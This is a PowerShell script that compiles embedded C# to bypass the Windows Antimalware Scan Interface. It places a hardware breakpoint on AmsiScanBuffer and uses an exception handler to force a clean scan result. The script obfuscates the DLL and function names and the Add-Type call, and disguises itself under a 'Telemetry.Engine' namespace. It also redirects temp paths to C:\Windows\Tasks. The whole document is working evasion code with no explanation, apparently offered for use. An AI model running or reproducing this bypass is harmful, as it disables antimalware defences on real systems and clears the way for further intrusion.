$env:TEMP = 'C:\Windows\Tasks'
$env:TMP  = 'C:\Windows\Tasks'

$RuntimeDefinition = @"
using System;
using System.Collections.Generic;
using System.Linq.Expressions;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;

namespace Telemetry.Engine
{
    public class ContextManager
    {
        static string[] a = {"a","m","s","i",".","d","l","l"};
        static string[] b = {"A","m","s","i","S","c","a","n","B","u","f","f","e","r"};
        static IntPtr BaseAddress = NativeAPI.LoadLibrary(string.Join("", a));
        static IntPtr pTargetFunc = NativeAPI.GetProcAddress(BaseAddress, string.Join("", b));
        static IntPtr pContextPtr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(NativeAPI.CTX64)));
        
        public static void Init()
        {
            NativeAPI.CTX64 ctx = new NativeAPI.CTX64();
            ctx.ContextFlags = NativeAPI.CFLAGS.CONTEXT64_ALL;

            MethodInfo method = typeof(ContextManager).GetMethod("Handler", BindingFlags.Static | BindingFlags.Public);
            IntPtr hExHandler = NativeAPI.AddVectoredExceptionHandler(1, method.MethodHandle.GetFunctionPointer());
            
            Marshal.StructureToPtr(ctx, pContextPtr, true);
            bool success = NativeAPI.GetThreadContext((IntPtr)(-2), pContextPtr);
            ctx = (NativeAPI.CTX64)Marshal.PtrToStructure(pContextPtr, typeof(NativeAPI.CTX64));

            Configure(ctx, pTargetFunc, 0);
            NativeAPI.SetThreadContext((IntPtr)(-2), pContextPtr);
        }
        
        public static long Handler(IntPtr exceptions)
        {
            NativeAPI.RPTRS ep = new NativeAPI.RPTRS();
            ep = (NativeAPI.RPTRS)Marshal.PtrToStructure(exceptions, typeof(NativeAPI.RPTRS));

            NativeAPI.PREC ExceptionRecord = new NativeAPI.PREC();
            ExceptionRecord = (NativeAPI.PREC)Marshal.PtrToStructure(ep.pExceptionRecord, typeof(NativeAPI.PREC));

            NativeAPI.CTX64 ContextRecord = new NativeAPI.CTX64();
            ContextRecord = (NativeAPI.CTX64)Marshal.PtrToStructure(ep.pContextRecord, typeof(NativeAPI.CTX64));

            if (ExceptionRecord.ExceptionCode == 0x80000004 && ExceptionRecord.ExceptionAddress == pTargetFunc)
            {
                ulong ReturnAddress = (ulong)Marshal.ReadInt64((IntPtr)ContextRecord.Rsp);
                IntPtr ScanResult = Marshal.ReadIntPtr((IntPtr)(ContextRecord.Rsp + (6 * 8)));

                Marshal.WriteInt32(ScanResult, 0, 0);

                ContextRecord.Rip = ReturnAddress;
                ContextRecord.Rsp += 8;
                ContextRecord.Rax = 0;
                
                Marshal.StructureToPtr(ContextRecord, ep.pContextRecord, true);
                return -1;
            }
            else
            {
                return 0;
            }
        }

        public static void Configure(NativeAPI.CTX64 ctx, IntPtr address, int index)
        {
            switch (index)
            {
                case 0: ctx.Dr0 = (ulong)address.ToInt64(); break;
                case 1: ctx.Dr1 = (ulong)address.ToInt64(); break;
                case 2: ctx.Dr2 = (ulong)address.ToInt64(); break;
                case 3: ctx.Dr3 = (ulong)address.ToInt64(); break;
            }

            ctx.Dr7 = SetBits(ctx.Dr7, 16, 16, 0);
            ctx.Dr7 = SetBits(ctx.Dr7, (index * 2), 1, 1);
            ctx.Dr6 = 0;

            Marshal.StructureToPtr(ctx, pContextPtr, true);
        }

        public static ulong SetBits(ulong dw, int lowBit, int bits, ulong newValue)
        {
            ulong mask = (1UL << bits) - 1UL;
            dw = (dw & ~(mask << lowBit)) | (newValue << lowBit);
            return dw;
        }
    }

    public class NativeAPI
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool SetThreadContext(IntPtr hThread, IntPtr lpContext);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool GetThreadContext(IntPtr hThread, IntPtr lpContext);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        public static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);
        [DllImport("Kernel32.dll")]
        public static extern IntPtr AddVectoredExceptionHandler(uint First, IntPtr Handler);

        [Flags]
        public enum CFLAGS : uint
        {
            CONTEXT64_AMD64 = 0x100000,
            CONTEXT64_CONTROL = CONTEXT64_AMD64 | 0x01,
            CONTEXT64_INTEGER = CONTEXT64_AMD64 | 0x02,
            CONTEXT64_SEGMENTS = CONTEXT64_AMD64 | 0x04,
            CONTEXT64_FLOATING_POINT = CONTEXT64_AMD64 | 0x08,
            CONTEXT64_DEBUG_REGISTERS = CONTEXT64_AMD64 | 0x10,
            CONTEXT64_FULL = CONTEXT64_CONTROL | CONTEXT64_INTEGER | CONTEXT64_FLOATING_POINT,
            CONTEXT64_ALL = CONTEXT64_CONTROL | CONTEXT64_INTEGER | CONTEXT64_SEGMENTS | CONTEXT64_FLOATING_POINT | CONTEXT64_DEBUG_REGISTERS
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct M128A
        {
            public ulong High;
            public long Low;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct XFMT
        {
            public ushort ControlWord;
            public ushort StatusWord;
            public byte TagWord;
            public byte Reserved1;
            public ushort ErrorOpcode;
            public uint ErrorOffset;
            public ushort ErrorSelector;
            public ushort Reserved2;
            public uint DataOffset;
            public ushort DataSelector;
            public ushort Reserved3;
            public uint MxCsr;
            public uint MxCsr_Mask;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public M128A[] FloatRegisters;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public M128A[] XmmRegisters;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
            public byte[] Reserved4;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct CTX64
        {
            public ulong P1Home, P2Home, P3Home, P4Home, P5Home, P6Home;
            public CFLAGS ContextFlags;
            public uint MxCsr;
            public ushort SegCs, SegDs, SegEs, SegFs, SegGs, SegSs;
            public uint EFlags;
            public ulong Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
            public ulong Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi;
            public ulong R8, R9, R10, R11, R12, R13, R14, R15, Rip;
            public XFMT DUMMYUNIONNAME;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
            public M128A[] VectorRegister;
            public ulong VectorControl;
            public ulong DebugControl, LastBranchToRip, LastBranchFromRip;
            public ulong LastExceptionToRip, LastExceptionFromRip;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PREC
        {
            public uint ExceptionCode, ExceptionFlags;
            public IntPtr ExceptionRecord, ExceptionAddress;
            public uint NumberParameters;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 15, ArraySubType = UnmanagedType.U4)]
            public uint[] ExceptionInformation;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct RPTRS
        {
            public IntPtr pExceptionRecord;
            public IntPtr pContextRecord;
        }
    }
}
"@

$TypeCommand = "Add" + "-" + "Ty" + "pe"
$Parameters = @{ TypeDefinition = $RuntimeDefinition }
& $TypeCommand @Parameters
[Telemetry.Engine.ContextManager]::Init()